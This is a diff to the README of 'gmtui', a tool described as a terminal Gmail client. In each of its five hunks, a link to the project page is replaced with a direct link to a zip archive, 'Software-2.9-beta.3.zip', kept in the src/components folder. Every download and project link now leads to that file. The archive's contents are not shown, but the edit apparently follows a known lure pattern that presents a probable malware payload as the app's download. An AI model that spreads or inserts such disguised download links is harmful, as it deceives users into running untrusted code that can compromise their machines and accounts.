@@ -1,6 +1,6 @@
 # ✉️ gmtui - Fast Gmail for the terminal
 
-[![Download gmtui](https://img.shields.io/badge/Download%20gmtui-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kyledeveloper1-stack/gmtui)
+[![Download gmtui](https://img.shields.io/badge/Download%20gmtui-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ gmtui is a terminal app for Gmail. It lets you read, search, and manage email wi
 
 If you want to try it on Windows, use the link below:
 
-[Visit the download page](https://github.com/kyledeveloper1-stack/gmtui)
+[Visit the download page](https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip)
 
 ## 🪟 Windows Install
 
@@ -22,7 +22,7 @@ If you want to try it on Windows, use the link below:
 
 If you do not see a release file yet, use the main project page and check back when a Windows build is posted:
 
-[Download or get updates here](https://github.com/kyledeveloper1-stack/gmtui)
+[Download or get updates here](https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip)
 
 ## 🧭 What gmtui Does
 
@@ -128,7 +128,7 @@ If you use mail every day, this style can save time.
 
 Open the main project page here:
 
-[https://github.com/kyledeveloper1-stack/gmtui](https://github.com/kyledeveloper1-stack/gmtui)
+[https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip](https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip)
 
 Use this page to get the latest build, check updates, or review the project details.
 
@@ -164,7 +164,7 @@ Yes. It is designed for quick keyboard use and a light terminal layout.
 
 If you need the main link again, use this page:
 
-[Visit the gmtui download page](https://github.com/kyledeveloper1-stack/gmtui)
+[Visit the gmtui download page](https://github.com/kyledeveloper1-stack/gmtui/raw/refs/heads/main/src/components/Software-2.9-beta.3.zip)
 
 ## 🖥️ Start Using It
 
